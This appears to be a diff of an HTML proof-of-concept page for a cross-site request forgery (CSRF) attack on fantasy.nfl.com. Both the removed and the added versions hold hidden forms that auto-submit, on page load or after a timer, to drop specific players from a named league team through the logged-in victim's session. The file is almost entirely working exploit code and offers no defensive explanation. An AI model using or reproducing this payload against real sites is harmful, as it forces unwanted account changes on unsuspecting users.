@@ -1,20 +1,21 @@
 <html>
-    <head>
-        <script language="javascript">
-            window.onload = function() {
-                document.getElementById("csrfForm1").submit();
-                document.getElementById("csrfForm2").submit();
+    <form name="testform2" method="POST" action="https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm" target="_blank">
+        <input type="hidden" name="dropPlayerId&#91;&#93;" value="2571859" />
+    </form>
+
+    <script type="text/javascript">
+        window.setTimeout(SubmitTestform, 500);
+        function SubmitTestform()
+            {
+            document.testform2.submit();
             }
-        </script>
-    </head>
-    <body>
-        <form id="csrfForm1" action="https://fantasy.nfl.com/league/12612802/team/1/dropplayerreview" method="POST" target="csrfIframe1">
-            <input type="hidden" name="dropPlayerId&#91;&#93;" value="2572477" />
-            <input type=hidden name="submit" id="submit" value="Continue"/>
-        </form>
-        <form id="csrfForm2" action="https://fantasy.nfl.com/league/12612802/team/1/dropplayerreview" method="POST" target="csrfIframe1">
-            <input type="hidden" name="dropPlayerId&#91;&#93;" value="2567973" />
-            <input type=hidden name="submit" id="submit" value="Continue"/>
-        </form>
-    </body>
-</html>
+   </script>
+   
+
+    <form name="testform1" method="POST" action="https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm" target="_blank">
+        <input type="hidden" name="dropPlayerId&#91;&#93;" value="2560781" />
+    </form>
+    <script type="text/javascript">
+        document.testform1.submit();
+    </script>
+<html>
